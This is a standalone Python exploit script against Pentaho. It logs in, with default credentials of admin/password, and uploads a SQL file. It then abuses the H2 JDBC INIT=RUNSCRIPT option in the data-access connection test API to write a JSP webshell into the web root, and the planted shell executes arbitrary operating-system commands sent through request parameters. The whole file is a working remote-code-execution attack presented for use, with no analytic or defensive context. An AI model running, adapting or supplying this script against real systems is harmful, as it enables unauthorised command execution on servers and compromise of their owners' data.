from sys import argv

if len(argv) <= 1:
  exit("Usage: ./webshell host [username password]")

username = "admin"
password = "password"
if len(argv) == 4:
  username = argv[2]
  password = argv[3]

host = argv[1]
if not host.startswith("http"):
  host = "http://" + host

d = """CREATE TABLE test (
     id VARCHAR NOT NULL
);

INSERT INTO TEST VALUES ('
<%
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameterNames().nextElement()).getInputStream();
  int a = -1;
  byte[] b = new byte[2048];
  while((a=in.read(b)) != -1) {
    out.println(new String(b));
  }
%>
');
CALL CSVWRITE('../webapps/ROOT/PLACEHOLDER', 'SELECT * FROM test');"""

from secrets import token_hex
path = token_hex(16) + ".jsp"
d = d.replace("PLACEHOLDER", path)

from requests import put,post

r = post(f"{host}/pentaho/j_spring_security_check", data={"j_username": username, "j_password": password}, allow_redirects=False)
cookies = dict(r.cookies)

r = post(f"{host}/pentaho/UploadService?file_name=sql.txt&mark_temporary=false&unzip=false", files={"uploadFormElement": d}, cookies=cookies)
if r.status_code != 200:
  exit("failed")

r = put(f"{host}/pentaho/plugin/data-access/api/connection/test", json={"usingConnectionPool":False,"maximumPoolSize":20,"connectSql":"","name":"test","attributes":{"CUSTOM_URL":"jdbc:h2:mem:1337;INIT=RUNSCRIPT FROM '../../pentaho-solutions/system/metadata/csvfiles/sql.txt'","CUSTOM_DRIVER_CLASS":"org.h2.Driver"},"connectionPoolingProperties":{},"extraOptions":{},"extraOptionsOrder":{},"accessType":"NATIVE","databaseType":{"defaultDatabasePort":-1,"name":"Generic database","shortName":"GENERIC","supportedAccessTypes":["NATIVE","ODBC","JNDI"]}}, cookies=cookies)
if r.status_code != 200:
  exit("failed")

print(f"webshell at {host}/{path}?id")
